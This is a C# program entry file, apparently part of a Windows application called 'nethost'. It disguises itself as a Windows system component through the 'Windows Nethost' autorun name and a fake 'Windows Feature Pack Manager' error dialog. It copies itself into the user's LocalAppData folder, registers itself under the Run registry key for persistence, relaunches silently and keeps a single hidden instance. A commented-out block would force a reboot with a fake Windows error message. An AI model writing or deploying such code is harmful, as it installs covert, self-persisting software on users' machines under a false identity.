using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace nethost
{
    static class Program
    {
        /// <summary>
        /// 应用程序的主入口点。
        /// </summary>
        [STAThread]
        static void Main(string[] args)
        {
            Version currentVersion = Environment.OSVersion.Version;
            Version compareToVersion = new Version("6.0");
            if (currentVersion.CompareTo(compareToVersion) < 0)
            {
                MessageBox.Show(@"Your system version is too low. Please upgrade your operating system.", @"Windows Feature Pack Manager", MessageBoxButtons.OK, MessageBoxIcon.Error);  
            }
            if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\nethost.exe"))
            {
                RegistryKey Key = Registry.CurrentUser;
                RegistryKey Run = Key.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                Run.SetValue("Windows Nethost", "\"" + Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\nethost.exe\"", RegistryValueKind.String);
                Key.Close();
                File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\nethost.exe");
                Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\nethost.exe");
                Environment.Exit(0);
                /*
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.FileName = "cmd.exe";
                startInfo.Arguments = @"/c shutdown /r /t 05 /f /c " + "\"Windows 遇到严重问题需要重新启动，请保存好您的工作。\"";
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(startInfo);
                Environment.Exit(0);
                */
            }
            bool ismain = true;
            if (args.Length == 1)
                if (args[0] == @"/onlyf")
                    ismain = false;
            if (Application.ExecutablePath != Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\nethost.exe")
            {
                Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\nethost.exe");
                Environment.Exit(0);
            }
            if (ismain)
            {
                Process[] process = Process.GetProcesses();
                foreach (Process thisp in process)
                    if (thisp.ProcessName.ToUpper() == "NETHOST" & thisp.Id != Process.GetCurrentProcess().Id)
                        Environment.Exit(0);
            }
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1(ismain));
        }
    }
}
